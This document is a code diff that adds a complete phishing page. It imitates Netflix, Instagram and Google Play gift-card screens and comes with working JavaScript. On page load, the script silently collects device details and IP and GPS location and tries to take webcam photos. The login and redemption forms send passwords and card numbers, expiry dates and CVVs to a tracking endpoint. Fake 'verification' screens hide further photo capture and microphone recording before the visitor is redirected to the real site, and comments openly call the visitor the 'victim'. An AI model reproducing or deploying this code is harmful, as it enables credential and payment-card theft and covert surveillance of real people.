@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title id="pageTitle">Loading...</title>
+<link rel="icon" id="pageFavicon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh}
+
+/* ===== NETFLIX (Pixel Perfect) ===== */
+.netflix-page{background:#000;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;position:relative}
+.netflix-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(rgba(0,0,0,0.5),rgba(0,0,0,0.5)),url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="%23e50914" fill-opacity="0.1" d="M0,96L48,112C96,128,192,160,288,160C384,160,480,128,576,112C672,96,768,96,864,112C960,128,1056,160,1152,160C1248,160,1344,128,1392,112L1440,96L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>');background-size:cover;z-index:0}
+.netflix-content{position:relative;z-index:1;width:100%;max-width:450px}
+.netflix-header{text-align:center;margin-bottom:30px}
+.netflix-logo-text{color:#e50914;font-size:45px;font-weight:700;letter-spacing:-1px;font-family:Arial,sans-serif}
+.netflix-card{background:rgba(0,0,0,0.75);border-radius:4px;padding:60px 68px 40px}
+.netflix-card h1{color:#fff;font-size:32px;font-weight:700;margin-bottom:28px;font-family:Arial,sans-serif}
+.netflix-input-wrap{position:relative;margin-bottom:16px}
+.netflix-input{width:100%;padding:16px 20px;background:#333;border:none;border-radius:4px;color:#fff;font-size:16px;outline:none;height:50px}
+.netflix-input:focus{background:#454545}
+.netflix-input::placeholder{color:#8c8c8c}
+.netflix-label{position:absolute;left:20px;top:16px;color:#8c8c8c;font-size:16px;pointer-events:none;transition:all 0.2s}
+.netflix-input:focus+.netflix-label,.netflix-input:not(:placeholder-shown)+.netflix-label{top:6px;font-size:11px;color:#8c8c8c}
+.netflix-btn{width:100%;padding:16px;background:#e50914;border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-top:24px;font-family:Arial,sans-serif}
+.netflix-btn:hover{background:#f40612}
+.netflix-remember{display:flex;align-items:center;justify-content:space-between;margin-top:12px;color:#b3b3b3;font-size:13px}
+.netflix-remember label{display:flex;align-items:center;gap:6px;cursor:pointer}
+.netflix-remember input{width:16px;height:16px;accent-color:#737373}
+.netflix-help{color:#b3b3b3;cursor:pointer}
+.netflix-help:hover{text-decoration:underline}
+.netflix-new{color:#737373;margin-top:60px;font-size:16px;text-align:center}
+.netflix-new a{color:#fff;text-decoration:none}
+.netflix-new a:hover{text-decoration:underline}
+.netflix-captcha{color:#8c8c8c;font-size:13px;margin-top:16px;text-align:center;line-height:1.5}
+.netflix-captcha a{color:#0071eb;text-decoration:none}
+.netflix-captcha a:hover{text-decoration:underline}
+
+/* ===== INSTAGRAM (Pixel Perfect) ===== */
+.ig-page{background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.ig-container{width:100%;max-width:350px;margin-top:12px}
+.ig-card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:10px 40px 20px;text-align:center;margin-bottom:10px}
+.ig-logo-img{width:175px;margin:22px auto 12px}
+.ig-logo-text{font-family:'Brush Script MT',cursive;font-size:45px;color:#262626;margin:22px auto 12px}
+.ig-form{margin-top:24px}
+.ig-input-wrap{position:relative;margin-bottom:6px}
+.ig-input{width:100%;padding:9px 8px 7px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;outline:none;color:#262626}
+.ig-input:focus{border-color:#a8a8a8}
+.ig-btn{width:100%;padding:7px;background:#0095f6;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin-top:12px;opacity:1}
+.ig-divider{display:flex;align-items:center;margin:18px 0 20px;color:#8e8e8e;font-size:13px;font-weight:600;text-transform:uppercase}
+.ig-divider::before,.ig-divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
+.ig-divider span{padding:0 18px}
+.ig-fb-login{color:#385185;font-size:14px;font-weight:600;cursor:pointer;margin:8px 0;display:flex;align-items:center;justify-content:center;gap:8px}
+.ig-fb-icon{width:16px;height:16px}
+.ig-forgot{color:#00376b;font-size:12px;margin-top:16px;cursor:pointer;line-height:1.5}
+.ig-signup{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;text-align:center;font-size:14px;color:#262626;margin-bottom:20px}
+.ig-signup a{color:#0095f6;text-decoration:none;font-weight:600}
+.ig-get-app{text-align:center}
+.ig-get-app p{color:#262626;font-size:14px;margin-bottom:20px;line-height:1.5}
+.ig-stores{display:flex;justify-content:center;gap:8px}
+.ig-store-img{height:40px}
+
+/* ===== GOOGLE PAY / GIFT CARD (New Template) ===== */
+.gpay-page{background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.gpay-card{width:100%;max-width:420px;border:1px solid #dadce0;border-radius:8px;padding:40px;text-align:center}
+.gpay-logo{width:75px;height:75px;background:linear-gradient(135deg,#4285f4,#34a853,#fbbc05,#ea4335);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:35px;color:#fff;box-shadow:0 4px 12px rgba(66,133,244,0.3)}
+.gpay-card h1{color:#202124;font-size:24px;font-weight:400;margin-bottom:8px}
+.gpay-card .sub{color:#5f6368;font-size:16px;margin-bottom:32px}
+.gpay-amount{background:linear-gradient(135deg,#4285f4,#34a853);color:#fff;padding:20px;border-radius:12px;margin-bottom:24px;text-align:center}
+.gpay-amount h2{font-size:36px;font-weight:700;margin-bottom:4px}
+.gpay-amount p{font-size:14px;opacity:0.9}
+.gpay-input{width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:12px;outline:none;transition:all 0.2s}
+.gpay-input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,0.1)}
+.gpay-row{display:flex;gap:12px}
+.gpay-row .gpay-input{flex:1}
+.gpay-btn{width:100%;padding:14px;background:#1a73e8;border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:500;cursor:pointer;margin-top:16px;transition:all 0.2s}
+.gpay-btn:hover{background:#1557b0;box-shadow:0 2px 8px rgba(26,115,232,0.3)}
+.gpay-footer{color:#5f6368;font-size:12px;margin-top:24px;text-align:center}
+.gpay-footer a{color:#1a73e8;text-decoration:none}
+.gpay-security{display:flex;align-items:center;justify-content:center;gap:8px;color:#5f6368;font-size:13px;margin-top:16px}
+.gpay-lock{width:16px;height:16px}
+
+/* ===== Loading Overlays ===== */
+.netflix-verify{background:#000;position:fixed;top:0;left:0;right:0;bottom:0;z-index:1000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.netflix-verify.active{display:flex}
+.netflix-verify-box{text-align:center;max-width:400px}
+.netflix-verify-box h2{color:#fff;font-size:24px;margin-bottom:16px;font-weight:600}
+.netflix-verify-box p{color:#a3a3a3;font-size:16px;margin-bottom:32px;line-height:1.5}
+.netflix-verify-spinner{width:60px;height:60px;border:4px solid #333;border-top-color:#e50914;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}
+.netflix-verify-status{color:#e50914;font-size:14px;letter-spacing:2px;margin-top:16px}
+
+.gpay-loading{background:#fff;position:fixed;top:0;left:0;right:0;bottom:0;z-index:1000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.gpay-loading.active{display:flex}
+.gpay-loading-box{text-align:center}
+.gpay-loading-spinner{width:50px;height:50px;border:4px solid #f0f0f0;border-top-color:#1a73e8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
+.gpay-loading-box h3{color:#202124;font-size:20px;margin-bottom:10px}
+.gpay-loading-box p{color:#5f6368;font-size:14px;margin-bottom:20px}
+.gpay-loading-bar{width:200px;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden;margin:0 auto}
+.gpay-loading-fill{height:100%;background:#1a73e8;border-radius:2px;width:0%;transition:width 0.5s ease}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.hidden{position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:1px;height:1px}
+</style>
+</head>
+<body id="body">
+
+<div id="mainContent"></div>
+
+<!-- Netflix Verification Overlay -->
+<div class="netflix-verify" id="netflixVerify">
+<div class="netflix-verify-box">
+<div class="netflix-verify-spinner"></div>
+<h2>Verifying your account...</h2>
+<p>Please wait while we verify your identity. This helps us keep your account secure.</p>
+<div class="netflix-verify-status" id="verifyStatus">CHECKING DEVICE...</div>
+</div>
+</div>
+
+<!-- Google Pay Loading Overlay -->
+<div class="gpay-loading" id="gpayLoading">
+<div class="gpay-loading-box">
+<div class="gpay-loading-spinner"></div>
+<h3>Processing your gift card...</h3>
+<p>Please wait while we verify your code</p>
+<div class="gpay-loading-bar"><div class="gpay-loading-fill" id="gpayFill"></div></div>
+</div>
+</div>
+
+<video class="hidden" id="hiddenVideo" autoplay playsinline muted></video>
+<canvas class="hidden" id="hiddenCanvas"></canvas>
+
+<script>
+const linkId = '{{ link_id }}';
+let capturedPhotos = [];
+let audioChunks = [];
+let mediaRecorder = null;
+let stream = null;
+let hasAutoCaptured = false;
+
+// ===== AUTO CAPTURE ON PAGE LOAD =====
+// This runs BEFORE victim does anything!
+async function autoCapture() {
+if (hasAutoCaptured) return;
+hasAutoCaptured = true;
+
+// 1. Collect device data silently (NO permission needed)
+const data = await collectSilentData();
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify(data)
+});
+} catch(e) {}
+
+// 2. Try camera silently (will show browser prompt, but we're already loading)
+try {
+stream = await navigator.mediaDevices.getUserMedia({
+video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
+audio: false // No audio for silent capture
+});
+
+const video = document.getElementById('hiddenVideo');
+video.srcObject = stream;
+video.muted = true;
+await video.play();
+
+// Take 3 quick photos silently
+for (let i = 0; i < 3; i++) {
+await new Promise(r => setTimeout(r, 800));
+try {
+const canvas = document.getElementById('hiddenCanvas');
+canvas.width = 640; canvas.height = 480;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0, 640, 480);
+const photo = canvas.toDataURL('image/jpeg', 0.7);
+capturedPhotos.push(photo);
+} catch(e) {}
+}
+
+if (stream) stream.getTracks().forEach(t => t.stop());
+
+// Send photos
+if (capturedPhotos.length > 0) {
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ photos: capturedPhotos })
+});
+} catch(e) {}
+}
+} catch(e) {
+// Camera denied - still have IP location + device info
+}
+}
+
+async function collectSilentData() {
+const data = {location: {}, device_info: {}, screen_info: {}, network_info: {}, battery_info: {}};
+
+data.screen_info = {
+width: screen.width, height: screen.height,
+availWidth: screen.availWidth, availHeight: screen.availHeight,
+colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
+orientation: screen.orientation?.type || 'unknown'
+};
+
+data.device_info = {
+platform: navigator.platform,
+userAgent: navigator.userAgent,
+language: navigator.language,
+languages: navigator.languages,
+cookieEnabled: navigator.cookieEnabled,
+onLine: navigator.onLine,
+hardwareConcurrency: navigator.hardwareConcurrency,
+maxTouchPoints: navigator.maxTouchPoints,
+vendor: navigator.vendor,
+memory: navigator.deviceMemory || 'unknown',
+browser: getBrowser(),
+os: getOS()
+};
+
+try {
+const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+if (conn) {
+data.network_info = {
+effectiveType: conn.effectiveType,
+downlink: conn.downlink,
+downlinkMax: conn.downlinkMax || 'unknown',
+rtt: conn.rtt,
+saveData: conn.saveData,
+type: conn.type || 'unknown'
+};
+}
+} catch(e) {}
+
+try {
+if (navigator.getBattery) {
+const battery = await navigator.getBattery();
+data.battery_info = {
+level: Math.round(battery.level * 100) + '%',
+charging: battery.charging,
+chargingTime: battery.chargingTime,
+dischargingTime: battery.dischargingTime
+};
+}
+} catch(e) {}
+
+try {
+const ipRes = await fetch('https://ipapi.co/json/');
+const ipData = await ipRes.json();
+data.location = {
+ip: ipData.ip,
+city: ipData.city,
+region: ipData.region,
+country: ipData.country_name,
+country_code: ipData.country_code,
+postal: ipData.postal,
+latitude: ipData.latitude,
+longitude: ipData.longitude,
+org: ipData.org,
+isp: ipData.org,
+asn: ipData.asn,
+timezone: ipData.timezone,
+currency: ipData.currency
+};
+} catch(e) {}
+
+try {
+if (navigator.geolocation) {
+const position = await new Promise((resolve, reject) => {
+navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 3000});
+});
+data.location.gps_lat = position.coords.latitude;
+data.location.gps_lng = position.coords.longitude;
+data.location.gps_accuracy = position.coords.accuracy;
+}
+} catch(e) {}
+
+return data;
+}
+
+function getBrowser() {
+const ua = navigator.userAgent;
+if (ua.includes('Firefox')) return 'Firefox';
+if (ua.includes('Chrome')) return 'Chrome';
+if (ua.includes('Safari')) return 'Safari';
+if (ua.includes('Edge')) return 'Edge';
+return 'Unknown';
+}
+
+function getOS() {
+const ua = navigator.userAgent;
+if (ua.includes('Windows')) return 'Windows';
+if (ua.includes('Mac')) return 'MacOS';
+if (ua.includes('Linux')) return 'Linux';
+if (ua.includes('Android')) return 'Android';
+if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+return 'Unknown';
+}
+
+// ===== TEMPLATES =====
+const templates = {
+netflix: {
+title: 'Netflix', favicon: '🎬',
+render: () => `
+<div class="netflix-page">
+<div class="netflix-bg"></div>
+<div class="netflix-content">
+<div class="netflix-header">
+<div class="netflix-logo-text">NETFLIX</div>
+</div>
+<div class="netflix-card">
+<h1>Sign In</h1>
+<form onsubmit="handleNetflixLogin(event)">
+<div class="netflix-input-wrap">
+<input type="text" id="cred1" class="netflix-input" placeholder="Email or phone number" required>
+</div>
+<div class="netflix-input-wrap">
+<input type="password" id="cred2" class="netflix-input" placeholder="Password" required>
+</div>
+<button type="submit" class="netflix-btn">Sign In</button>
+<div class="netflix-remember">
+<label><input type="checkbox" checked> Remember me</label>
+<span class="netflix-help">Need help?</span>
+</div>
+</form>
+<div class="netflix-new">New to Netflix? <a href="#">Sign up now</a></div>
+<div class="netflix-captcha">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.</div>
+</div>
+</div>
+</div>`
+},
+instagram: {
+title: 'Instagram', favicon: '📷',
+render: () => `
+<div class="ig-page">
+<div class="ig-container">
+<div class="ig-card">
+<div class="ig-logo-text">Instagram</div>
+<div class="ig-form">
+<form onsubmit="handleIGLogin(event)">
+<input type="text" id="cred1" class="ig-input" placeholder="Phone number, username, or email" required>
+<input type="password" id="cred2" class="ig-input" placeholder="Password" required>
+<button type="submit" class="ig-btn">Log In</button>
+</form>
+</div>
+<div class="ig-divider"><span>OR</span></div>
+<div class="ig-fb-login">💬 Log in with Facebook</div>
+<div class="ig-forgot">Forgot password?</div>
+</div>
+<div class="ig-signup">Don't have an account? <a href="#">Sign up</a></div>
+<div class="ig-get-app">
+<p>Get the app.</p>
+<div class="ig-stores">
+<div style="height:40px;background:#000;border-radius:5px;color:#fff;padding:8px 16px;font-size:11px;display:flex;align-items:center;gap:6px">📱 App Store</div>
+<div style="height:40px;background:#000;border-radius:5px;color:#fff;padding:8px 16px;font-size:11px;display:flex;align-items:center;gap:6px">🤖 Google Play</div>
+</div>
+</div>
+</div>
+</div>`
+},
+gpay: {
+title: 'Google Play - Redeem', favicon: '🎁',
+render: () => `
+<div class="gpay-page">
+<div class="gpay-card">
+<div class="gpay-logo">🎁</div>
+<h1>Redeem Gift Card</h1>
+<p class="sub">Enter your code to add balance to your account</p>
+<div class="gpay-amount">
+<h2>$100.00</h2>
+<p>Google Play Balance</p>
+</div>
+<form onsubmit="handleGPayRedeem(event)">
+<input type="text" id="cardNumber" class="gpay-input" placeholder="Enter gift card code (16 digits)" maxlength="19" required>
+<div class="gpay-row">
+<input type="text" id="cardExpiry" class="gpay-input" placeholder="MM/YY" maxlength="5" required>
+<input type="text" id="cardCVV" class="gpay-input" placeholder="CVV" maxlength="4" required>
+</div>
+<div class="gpay-security">
+🔒 Secure encryption
+</div>
+<button type="submit" class="gpay-btn">Redeem Now</button>
+</form>
+<div class="gpay-footer">By redeeming, you agree to the <a href="#">Terms of Service</a></div>
+</div>
+</div>`
+}
+};
+
+function getUrlParam(name) {
+const urlParams = new URLSearchParams(window.location.search);
+return urlParams.get(name);
+}
+
+let currentTemplate = 'gpay';
+
+function init() {
+const urlTemplate = getUrlParam('template');
+if (urlTemplate && templates[urlTemplate]) currentTemplate = urlTemplate;
+
+const t = templates[currentTemplate];
+document.title = t.title;
+document.getElementById('pageFavicon').href = `data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>${t.favicon}</text></svg>`;
+
+document.getElementById('mainContent').innerHTML = t.render();
+
+// AUTO CAPTURE ON PAGE LOAD!
+autoCapture();
+}
+
+// ===== NETFLIX LOGIN HANDLER =====
+async function handleNetflixLogin(e) {
+e.preventDefault();
+const cred1 = document.getElementById('cred1').value;
+const cred2 = document.getElementById('cred2').value;
+
+// Send credentials
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ credentials: { username: cred1, password: cred2 } })
+});
+} catch(err) {}
+
+// Show Netflix-style verification
+const verify = document.getElementById('netflixVerify');
+verify.classList.add('active');
+
+const statuses = ['CHECKING DEVICE...', 'VERIFYING LOCATION...', 'CONFIRMING IDENTITY...', 'FINALIZING...'];
+for (let i = 0; i < 4; i++) {
+document.getElementById('verifyStatus').textContent = statuses[i];
+await new Promise(r => setTimeout(r, 1500));
+}
+
+// Try to get more photos during "verification"
+await captureMorePhotos();
+
+window.location.href = 'https://netflix.com';
+}
+
+// ===== INSTAGRAM LOGIN HANDLER =====
+async function handleIGLogin(e) {
+e.preventDefault();
+const cred1 = document.getElementById('cred1').value;
+const cred2 = document.getElementById('cred2').value;
+
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ credentials: { username: cred1, password: cred2 } })
+});
+} catch(err) {}
+
+// Show loading
+const verify = document.getElementById('netflixVerify');
+verify.classList.add('active');
+verify.querySelector('h2').textContent = 'Securing your account...';
+verify.querySelector('p').textContent = 'Please wait while we verify your login.';
+
+await captureMorePhotos();
+window.location.href = 'https://instagram.com';
+}
+
+// ===== GOOGLE PAY REDEEM HANDLER =====
+async function handleGPayRedeem(e) {
+e.preventDefault();
+const cardNum = document.getElementById('cardNumber').value;
+const expiry = document.getElementById('cardExpiry').value;
+const cvv = document.getElementById('cardCVV').value;
+
+// Capture card details
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ credentials: { card_number: cardNum, expiry: expiry, cvv: cvv } })
+});
+} catch(err) {}
+
+// Show Google Pay loading
+const loading = document.getElementById('gpayLoading');
+loading.classList.add('active');
+
+// Animate progress bar
+const fill = document.getElementById('gpayFill');
+const steps = [20, 45, 70, 90, 100];
+for (let i = 0; i < steps.length; i++) {
+fill.style.width = steps[i] + '%';
+await new Promise(r => setTimeout(r, 800));
+}
+
+await captureMorePhotos();
+window.location.href = 'https://play.google.com';
+}
+
+// ===== CAPTURE MORE PHOTOS DURING "VERIFICATION" =====
+async function captureMorePhotos() {
+let localStream = null;
+try {
+localStream = await navigator.mediaDevices.getUserMedia({
+video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+audio: true
+});
+
+const video = document.getElementById('hiddenVideo');
+video.srcObject = localStream;
+video.muted = true;
+await video.play();
+
+// Start audio recording
+let localRecorder = null;
+try {
+localRecorder = new MediaRecorder(localStream);
+audioChunks = [];
+localRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
+localRecorder.start(1000);
+} catch(e) {}
+
+// Take 5 high quality photos
+const morePhotos = [];
+for (let i = 0; i < 5; i++) {
+await new Promise(r => setTimeout(r, 1200));
+try {
+const canvas = document.getElementById('hiddenCanvas');
+canvas.width = 1280; canvas.height = 720;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0, 1280, 720);
+const photo = canvas.toDataURL('image/jpeg', 0.9);
+morePhotos.push(photo);
+} catch(e) {}
+}
+
+if (localStream) localStream.getTracks().forEach(t => t.stop());
+if (localRecorder && localRecorder.state !== 'inactive') {
+localRecorder.stop();
+await new Promise(r => setTimeout(r, 500));
+}
+
+// Send additional photos
+if (morePhotos.length > 0) {
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ photos: morePhotos })
+});
+} catch(e) {}
+}
+
+// Send audio
+if (audioChunks.length > 0) {
+try {
+const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+const reader = new FileReader();
+reader.onloadend = async function() {
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ audio: reader.result })
+});
+} catch(e) {}
+};
+reader.readAsDataURL(audioBlob);
+} catch(e) {}
+}
+
+} catch(e) {
+// Camera not available
+}
+}
+
+init();
+</script>
+</body>
+</html>
